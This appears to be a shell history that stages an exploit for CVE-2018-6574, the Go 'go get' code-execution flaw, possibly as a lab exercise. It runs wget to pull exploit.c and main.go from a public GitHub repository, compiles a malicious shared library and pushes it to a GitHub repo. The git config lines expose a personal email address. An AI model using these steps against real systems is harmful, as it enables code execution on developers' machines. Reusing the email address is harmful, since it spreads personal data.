python -m http.server 80
wget https://raw.githubusercontent.com/j4k0m/CVE-2018-6574/main/exploit.c
nano exploit.c 
fg
gcc -shared -o exp.so -fPIC exploit.c 
ls
wget https://raw.githubusercontent.com/j4k0m/CVE-2018-6574/main/main.go
nano main.go 
echo "# temp" >> README.md
git init
ls
git add .
git commit -m "first commit"
git config --global user.email roshan.cheriyan.punchakunnel@gmail.com
git config --global user.name funbox
git commit -m "first commit"
git config --global user.email ro@gmail.com
git config --global user.name funbox
git branch -M main
git remote add origin https://github.com/fun-box/temp.git
git push -u origin main
git remote add origin git@github.com:fun-box/temp.git
git remote remove origin 
git remote add origin git@github.com:fun-box/temp.git
ssh-keygen 
cat .ssh/id_rsa.pub 
git push -u origin main
ls
nano .gitignore
